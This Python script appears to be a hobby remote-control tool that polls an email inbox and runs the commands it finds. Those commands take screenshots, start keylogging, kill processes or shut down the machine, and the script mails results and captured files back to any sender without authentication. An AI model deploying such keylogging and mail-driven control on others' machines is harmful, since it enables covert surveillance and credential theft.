import mail_handle_receive
import mail_handle_send
import system_control
import datetime
import keylogr
import resource_monitor
import time
import re
import os


def shutdown():
    print("Shutting down in 10 seconds")
    system_control.countdown(10)
    os.system("shutdown -s -t 0")


def help():
    pass


function_map = {
    'help': help,
    'shutdown': shutdown,
    'screenshot': system_control.screenshot,
    # 'list_apps': resource_monitor.list_apps,
    # 'open_app': resource_monitor.open_app,
    # 'close_app': resource_monitor.close_app,
    'list_processes': resource_monitor.list_processes,
    'kill_process': resource_monitor.kill_process,
    'keylog': keylogr.keylog
}


def request_handle(msg_list):
    if msg_list == None:
        print("No new command")
        return
    for msg in msg_list:
        recipient_mail = re.search(r'[\w\.-]+@[\w\.-]+', msg['From']).group()
        cmd_list = mail_handle_receive.decode_mail(msg)

        for cmd in cmd_list:
            try:
                cmd = cmd.lower().strip()
                if cmd == 'screenshot' or cmd == 'keylog':
                    filename = function_map[cmd](15)
                    print('Saved to', filename)
                    mail_handle_send.send_mail_success_execution(
                        recipient_mail, cmd, filename)
                elif cmd == 'shutdown':
                    mail_handle_send.send_mail_success_execution(
                        recipient_mail, cmd)
                    function_map[cmd]()
                elif 'kill_process' in cmd:
                    pid_match = re.search(r'\d+', cmd)
                    pid = pid_match.group()
                    function_map[cmd.split(' ')[0]](int(pid))
                else:
                    function_map[cmd]()
                    mail_handle_send.send_mail_success_execution(
                        recipient_mail, cmd)
            except Exception as e:
                print(e)
                mail_handle_send.send_mail_failure_execution(
                    recipient_mail, cmd)


def main():
    mail = mail_handle_receive.login()
    while True:
        now = datetime.datetime.now()
        timestamp = '\n> > > >[ '+now.strftime("%H:%M:%S") + ' ]< < < <\n'
        print(timestamp)
        msg_list = mail_handle_receive.get_mail_object(mail)
        request_handle(msg_list)
        time.sleep(10)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExited")
        os.system("pause")
